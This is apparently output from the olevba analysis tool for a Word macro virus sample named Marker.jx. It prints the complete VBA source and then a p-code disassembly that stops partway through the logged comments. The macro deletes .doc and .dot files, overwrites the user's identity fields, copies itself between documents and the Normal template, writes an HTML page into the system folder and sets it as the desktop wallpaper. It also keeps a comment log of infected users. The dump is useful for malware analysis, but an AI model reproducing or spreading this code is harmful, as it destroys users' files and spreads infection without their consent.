olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.jx
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.jx - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Seline, Where are you dear
Const Marker = "<- this is a marker! by jonhehehe TheBest-versi212x"
Private Sub Document_Open()
Document_Close
End Sub
Private Sub Document_Close()
Dim nmod As Object
Dim isd As String
Dim DS, NTS, DI, NTI As Boolean
Dim Jon, Users, LogData, LogFile As String
On Error Resume Next
'AddIns.Unload True
Kill Options.DefaultFilePath(8) & "\*.doc"
Kill Options.DefaultFilePath(8) & "\*.dot"
'Options.VirusProtection = False
Application.UserName = "JonMMx 2000"
Application.UserInitials = "MeMeX"
Application.UserAddress = "JonMMx2000@yahoo.com"
Application.EnableCancelKey = wdCancelDisabled
GoSub InsertIon
If (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", _
   "LogData in") = False) Then GoSub LoggingIn
If WeekDay(Now()) = 1 Then GoSub ShowMe
GoTo Finish
InsertIon:
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
DI = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NTI = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)
If (DI Xor NTI) And (ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate) Then
 If DI Then
   NTS = NormalTemplate.Saved
   Jon = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
   For i = 1 To Len(Application.UserAddress)
    If (Mid(Application.UserAddress, i, 1) <> Chr(13)) Then
       If (Mid(Application.UserAddress, i, 1) <> Chr(10)) Then
          Users = Users & Mid(Application.UserAddress, i, 1)
       End If
    Else
       Users = Users & Chr(13) & " '"
    End If
   Next
   Jon = Jon & Chr(13) & _
         "' " & Format(Time, "hh:mm:sc AMPM-") & _
                Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
         "' " & Application.UserName & Chr(13) & _
         "' " & Users & Chr(13) & Chr(13) & " "
   nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
   nt.CodeModule.AddFromString Jon
   If NTS Then NormalTemplate.Save
 End If
 If NTI Then
    DS = ActiveDocument.Saved
    Jon = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString Jon
    If DS Then ActiveDocument.Save
 End If
End If
Return
LoggingIn:
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogData in") = True
   GoSub ShowMe
Return
ShowMe:
Dim RootsyS As String
On Error Resume Next
 RootsyS = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot")
 Open RootsyS & "\Jon.html" For Output As #1
 Print #1, "<Html><head><title>Welcome to Destroyer of the last Manillenium JontheBEST</title></head><Body><body bgcolor = '#FFF212' >"
 Print #1, "<center><p align='center'><font color='#800000'size='25'><strong>a Poet For My Dear Love</strong></font></p>"
 Print #1, "<p align='center'><font color='#000000' size='6'><strong><a href='mailto:iamwaiting@yahoo.com'>Dear Iin</a></strong></font> </p>"
 Print #1, "<font normal></center>To the very best that happen in mylife<p>"
 Print #1, "<p>Long ago and in my mind, I can see your face lonely and lost in time "
 Print #1, "<p>You were gone since yester month But the memories, never would dissapear"
 Print #1, "<p>I think of you, I THINK OF YOU.<p>"
 Print #1, "<p>Yes it's true I can pretend. But the paint of blue, keep beat me till the end."
 Print #1, "<p>Yes it's hard to understand. Why you leaving me and all we dreaming on "
 Print #1, "<p>Dear Iin, I close my eyes and see your face.  That's all I have to do to be with you. "
 Print #1, "<p>Dear Iin, altough I can not touch your face.  I know what I can do to be with you "
 Print #1, "<p>Long ago so faraway. But the light of blue, still living with me today."
 Print #1, "<p>You were gone since yester month.  But the memories never would dissapear."
 Print #1, "<center><font color='#245505' size='6'><strong><p>Speed Hari</strong></font></center></Body></html>"
 Close #1
 System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General", "Wallpaper") = RootsyS & "\Jon.html"
Return
Finish:
End Sub
'Logfile -->

' 06:14:2518:14:25 -Kamis, 22 Jul 1999
' JonMMx 2000
' jonthebest@hotbot.com


' 09:07:259:07:25 -Sabtu, 24 Jun 2017
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 12:13:3712:13:37 AM AM-Saturday, 14 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:55:459:55:45 AM AM-Wednesday, 25 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:05:474:05:47 AM AM-Thursday, 26 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 07:41:387:41:38 PM PM-Friday, 27 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 12:43:2212:43:22 PM PM-Monday, 30 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:02:559:02:55 -Sabtu, 28 Agust 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:16:1314:16:13 -Jumat, 3 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:17:374:17:37 AM AM-Saturday, 4 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:42:399:42:39 PM PM-Monday, 6 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:00:4210:00:42 PM PM-Wednesday, 8 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:19:334:19:33 PM PM-Thursday, 9 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:32:279:32:27 AM AM-Thursday, 16 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 01:23:111:23:11 PM PM-Wednesday, 6 Oct 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 12:56:212:56:02 PM PM-Friday, 8 Oct 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 11:37:611:37:06 AM AM-Saturday, 9 Oct 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:43:710:43:07 PM PM-Thursday, 14 Oct 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 05:30:25:30:02 PM PM-Wednesday, 10 Nov 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:17:510:17:05 AM AM-Tuesday, 16 Nov 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 06:17:146:17:14 PM PM-Monday, 15 Nov 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 07:32:467:32:46 PM PM-Thursday, 18 Nov 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 07:06:587:06:58 PM PM-Wednesday, 24 Nov 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:38:422:38:42 AM AM-Thursday, 25 Nov 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 08:59:48:59:04 PM PM-Thursday, 25 Nov 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 01:18:221:18:22 -Jumat, 26 Nop 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 07:51:287:51:28 PM PM-Monday, 29 Nov 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:58:510:58:05 -jeudi, 2 déc 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:11:114:11:01 -lundi, 6 déc 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 06:58:1918:58:19 -mardi, 7 déc 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:43:2714:43:27 -lundi, 13 déc 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 11:10:2511:10:25 -vendredi, 17 déc 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 11:47:3123:47:31 -lundi, 20 déc 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 11:45:5911:45:59 -mardi, 28 déc 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 03:11:2115:11:21 -vendredi, 7 janv 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:49:2616:49:26 -jueves, 27 ene 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 03:34:2415:34:24 -lunes, 7 feb 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:24:3714:24:37 -lunes, 14 feb 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 07:52:819:52:08 -sábado, 26 feb 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 05:51:217:51:02 -martes, 29 feb 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 05:11:2717:11:27 -lunes, 6 mar 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 06:35:5718:35:57  p.m.-jueves, 16 mar 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:22:4314:22:43 -martes, 28 mar 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 12:33:3412:33:34  p.m.-martes, 4 abr 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:40:514:40:05  p.m.-martes, 4 abr 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:48:214:48:02  p.m.-miércoles, 12 abr 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 05:46:3917:46:39 -martes, 18 abr 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:40:5710:40:57 AM AM-Miércoles, 19 Abr 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 05:21:2417:21:24 -martes, 16 may 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 05:18:2317:18:23 -martes, 23 may 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:59:2310:59:23 -lunes, 12 jun 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:37:229:37:22  a.m.-miércoles, 5 jul 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 12:46:5612:46:56  p.m.-miércoles, 5 jul 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 03:17:3415:17:34  p.m.-jueves, 6 jul 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:55:2110:55:21  a.m.-viernes, 18 ago 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 12:11:3012:11:30  p.m.-martes, 22 ago 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 11.41.511.41.05 -miércoles, 23 ago 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:07:99:07:09  a.m.-martes, 29 ago 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:42:399:42:39  a.m.-lunes, 4 sep 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 01:14:1313:14:13  p.m.-domingo, 13 oct 2002
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 11:06:611:06:06  a.m.-jueves, 26 oct 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 01:19:5713:19:57  p.m.-viernes, 3 nov 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 11:35:4111:35:41  a.m.-miércoles, 8 nov 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:47:249:47:24  a.m.-miércoles, 29 nov 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 08:48:248:48:24  a.m.-lunes, 4 dic 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 12:24:1012:24:10  p.m.-viernes, 15 dic 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:26:3316:26:33 -sábado, 26 may 2001
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 01:33:1913:33:19 -miércoles, 5 sep 2001
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 01.50.1213.50.12 -viernes, 14 sep 2001
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 06:38:518:38:05 -lunes, 24 sep 2001
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 05:20:45:20:04 PM PM-Monday, 19 Nov 2001
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:14:3514:14:35  <(©¿©)>-Tuesday, 20 Nov 2001
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 01:40:391:40:39 PM PM-Friday, 20 Apr 2001
' JonMMx 2000
' JonMMx2000@yahoo.com

 


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Marker.jx
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 24151 bytes
' Line #0:
' 	QuoteRem 0x0000 0x001A "Seline, Where are you dear"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0033 "<- this is a marker! by jonhehehe TheBest-versi212x"
' 	VarDefn Marker
' Line #2:
' 	FuncDefn (Private Sub Document_Open())
' Line #3:
' 	ArgsCall Document_Close 0x0000 
' Line #4:
' 	EndSub 
' Line #5:
' 	FuncDefn (Private Sub Document_Close())
' Line #6:
' 	Dim 
' 	VarDefn nmod (As Object)
' Line #7:
' 	Dim 
' 	VarDefn isd (As String)
' Line #8:
' 	Dim 
' 	VarDefn DS
' 	VarDefn NTS
' 	VarDefn DI
' 	VarDefn NTI (As Boolean)
' Line #9:
' 	Dim 
' 	VarDefn Jon
' 	VarDefn Users
' 	VarDefn LogData
' 	VarDefn LogFile (As String)
' Line #10:
' 	OnError (Resume Next) 
' Line #11:
' 	QuoteRem 0x0000 0x0012 "AddIns.Unload True"
' Line #12:
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0006 "\*.doc"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #13:
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0006 "\*.dot"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #14:
' 	QuoteRem 0x0000 0x001F "Options.VirusProtection = False"
' Line #15:
' 	LitStr 0x000B "JonMMx 2000"
' 	Ld Application 
' 	MemSt UserName 
' Line #16:
' 	LitStr 0x0005 "MeMeX"
' 	Ld Application 
' 	MemSt UserInitials 
' Line #17:
' 	LitStr 0x0014 "JonMMx2000@yahoo.com"
' 	Ld Application 
' 	MemSt UserAddress 
' Line #18:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #19:
' 	GoSub InsertIon 
' Line #20:
' 	LineCont 0x0004 0A 00 03 00
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x000A "LogData in"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	GoSub LoggingIn 
' 	EndIf 
' Line #21:
' 	ArgsLd Now 0x0000 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoSub ShowMe 
' 	EndIf 
' Line #22:
' 	GoTo Finish 
' Line #23:
' 	Label InsertIon 
' Line #24:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #25:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #26:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DI 
' Line #27:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NTI 
' Line #28:
' 	Ld DI 
' 	Ld NTI 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #29:
' 	Ld DI 
' 	IfBlock 
' Line #30:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St NTS 
' Line #31:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St Jon 
' Line #32:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd UserAddress 
' 	FnLen 
' 	For 
' Line #33:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #34:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #35:
' 	Ld Users 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St Users 
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	ElseBlock 
' Line #38:
' 	Ld Users 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 " '"
' 	Concat 
' 	St Users 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	StartForVariable 
' 	Next 
' Line #41:
' 	LineCont 0x0010 09 00 09 00 12 00 10 00 1E 00 09 00 29 00 09 00
' 	Ld Jon 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Time 
' 	LitStr 0x000E "hh:mm:sc AMPM-"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Users 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	St Jon 
' Line #42:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #43:
' 	Ld Jon 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #44:
' 	Ld NTS 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	Ld NTI 
' 	IfBlock 
' Line #47:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St DS 
' Line #48:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St Jon 
' Line #49:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #50:
' 	Ld Jon 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #51:
' 	Ld DS 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	EndIfBlock 
' Line #54:
' 	Return 
' Line #55:
' 	Label LoggingIn 
' Line #56:
' 	LitVarSpecial (True)
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x000A "LogData in"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #57:
' 	GoSub ShowMe 
' Line #58:
' 	Return 
' Line #59:
' 	Label ShowMe 
' Line #60:
' 	Dim 
' 	VarDefn RootsyS (As String)
' Line #61:
' 	OnError (Resume Next) 
' Line #62:
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000A "SystemRoot"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St RootsyS 
' Line #63:
' 	Ld RootsyS 
' 	LitStr 0x0009 "\Jon.html"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #64:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x007A "<Html><head><title>Welcome to Destroyer of the last Manillenium JontheBEST</title></head><Body><body bgcolor = '#FFF212' >"
' 	PrintItemNL 
' Line #65:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x006C "<center><p align='center'><font color='#800000'size='25'><strong>a Poet For My Dear Love</strong></font></p>"
' 	PrintItemNL 
' Line #66:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0080 "<p align='center'><font color='#000000' size='6'><strong><a href='mailto:iamwaiting@yahoo.com'>Dear Iin</a></strong></font> </p>"
' 	PrintItemNL 
' Line #67:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003F "<font normal></center>To the very best that happen in mylife<p>"
' 	PrintItemNL 
' Line #68:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0048 "<p>Long ago and in my mind, I can see your face lonely and lost in time "
' 	PrintItemNL 
' Line #69:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004B "<p>You were gone since yester month But the memories, never would dissapear"
' 	PrintItemNL 
' Line #70:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0025 "<p>I think of you, I THINK OF YOU.<p>"
' 	PrintItemNL 
' Line #71:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0051 "<p>Yes it's true I can pretend. But the paint of blue, keep beat me till the end."
' 	PrintItemNL 
' Line #72:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004A "<p>Yes it's hard to understand. Why you leaving me and all we dreaming on "
' 	PrintItemNL 
' Line #73:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0059 "<p>Dear Iin, I close my eyes and see your face.  That's all I have to do to be with you. "
' 	PrintItemNL 
' Line #74:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0055 "<p>Dear Iin, altough I can not touch your face.  I know what I can do to be with you "
' 	PrintItemNL 
' Line #75:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004A "<p>Long ago so faraway. But the light of blue, still living with me today."
' 	PrintItemNL 
' Line #76:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004D "<p>You were gone since yester month.  But the memories never would dissapear."
' 	PrintItemNL 
' Line #77:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0063 "<center><font color='#245505' size='6'><strong><p>Speed Hari</strong></font></center></Body></html>"
' 	PrintItemNL 
' Line #78:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #79:
' 	Ld RootsyS 
' 	LitStr 0x0009 "\Jon.html"
' 	Concat 
' 	LitStr 0x0000 ""
' 	LitStr 0x0046 "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General"
' 	LitStr 0x0009 "Wallpaper"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #80:
' 	Return 
' Line #81:
' 	Label Finish 
' Line #82:
' 	EndSub 
' Line #83:
' 	QuoteRem 0x0000 0x000B "Logfile -->"
' Line #84:
' Line #85:
' 	QuoteRem 0x0000 0x0025 " 06:14:2518:14:25 -Kamis, 22 Jul 1999"
' Line #86:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #87:
' 	QuoteRem 0x0000 0x0016 " jonthebest@hotbot.com"
' Line #88:
' Line #89:
' Line #90:
' 	QuoteRem 0x0000 0x0024 " 09:07:259:07:25 -Sabtu, 24 Jun 2017"
' Line #91:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #92:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #93:
' Line #94:
' Line #95:
' Line #96:
' Line #97:
' 	QuoteRem 0x0000 0x002D " 12:13:3712:13:37 AM AM-Saturday, 14 Aug 1999"
' Line #98:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #99:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #100:
' Line #101:
' Line #102:
' Line #103:
' Line #104:
' 	QuoteRem 0x0000 0x002D " 09:55:459:55:45 AM AM-Wednesday, 25 Aug 1999"
' Line #105:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #106:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #107:
' Line #108:
' Line #109:
' Line #110:
' Line #111:
' 	QuoteRem 0x0000 0x002C " 04:05:474:05:47 AM AM-Thursday, 26 Aug 1999"
' Line #112:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #113:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #114:
' Line #115:
' Line #116:
' Line #117:
' Line #118:
' 	QuoteRem 0x0000 0x002A " 07:41:387:41:38 PM PM-Friday, 27 Aug 1999"
' Line #119:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #120:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #121:
' Line #122:
' Line #123:
' Line #124:
' Line #125:
' 	QuoteRem 0x0000 0x002B " 12:43:2212:43:22 PM PM-Monday, 30 Aug 1999"
' Line #126:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #127:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #128:
' Line #129:
' Line #130:
' Line #131:
' Line #132:
' 	QuoteRem 0x0000 0x0026 " 09:02:559:02:55 -Sabtu, 28 Agust 1999"
' Line #133:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #134:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #135:
' Line #136:
' Line #137:
' Line #138:
' Line #139:
' 	QuoteRem 0x0000 0x0024 " 02:16:1314:16:13 -Jumat, 3 Sep 1999"
' Line #140:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #141:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #142:
' Line #143:
' Line #144:
' Line #145:
' Line #146:
' 	QuoteRem 0x0000 0x002B " 04:17:374:17:37 AM AM-Saturday, 4 Sep 1999"
' Line #147:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #148:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #149:
' Line #150:
' Line #151:
' Line #152:
' Line #153:
' 	QuoteRem 0x0000 0x0029 " 09:42:399:42:39 PM PM-Monday, 6 Sep 1999"
' Line #154:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #155:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #156:
' Line #157:
' Line #158:
' Line #159:
' Line #160:
' 	QuoteRem 0x0000 0x002D " 10:00:4210:00:42 PM PM-Wednesday, 8 Sep 1999"
' Line #161:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #162:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #163:
' Line #164:
' Line #165:
